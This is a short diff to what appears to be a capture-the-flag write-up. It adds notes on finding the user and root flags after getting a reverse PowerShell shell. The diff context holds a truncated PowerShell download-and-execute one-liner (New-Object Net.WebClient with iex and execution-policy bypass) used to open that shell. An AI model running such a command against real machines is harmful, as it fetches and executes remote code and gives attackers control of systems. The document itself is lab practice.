@@ -59,3 +59,5 @@ powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadStrin
 And boom we have a reverse powershell connection 
 
 From here just find the user flag, which was just a txt file located in C:\
+
+Then ran 'whoami' and found out we were already system user so we looked in Administrator/Desktop and found the root flag
